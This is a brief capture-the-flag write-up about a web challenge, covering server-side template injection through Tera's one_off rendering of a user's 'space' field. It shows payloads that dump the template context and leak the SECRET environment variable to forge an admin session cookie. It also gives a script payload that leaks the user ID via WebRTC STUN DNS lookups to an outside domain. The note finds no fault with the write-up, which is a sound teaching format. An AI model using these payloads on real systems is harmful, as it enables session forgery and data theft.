+ https://tera.netlify.app/docs/#templates
+ SSTI in `one_off` function in Tera when rendering "space"
```
  ctx.tera.insert(
    "space",
    &Tera::one_off(&user.space, &ctx.tera, true).unwrap_or_else(|_| user.space.clone()),
);
ctx.tera.insert("id", &id);
utils::render(tera, "space.html", ctx.tera).into_response()
```
+ When I printed out the template context with {{ __tera_context }}, I got:
  ```
  { "user": { "followers": [], "following": [], "id": "af787749-d532-4d37-94a6-2d6bc4201f63", "name": "lollol", "pass": "", "space": "{{ __tera_context }}" } }
  ```
+ use SSTI to leak the secret for session cookie with {{ get_env(name="SECRET") }}. With the secret and the user ID of admin, we can forge a session cookie to login as admin.
+ WebRTC: https://www.w3.org/TR/webrtc-nv-use-cases/
  WebRTC is an open framework for the web that enables Real-Time Communications (RTC) capabilities in the browser.
+ craft a minimal payload that would do DNS request for the STUN server I specify
```
<script>
async function a(){
    c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:1337"}]}
    (p=new RTCPeerConnection(c)).createDataChannel("d")
    await p.setLocalDescription()
}
a();
</script>
```
+ 


https://ctftime.org/writeup/37702
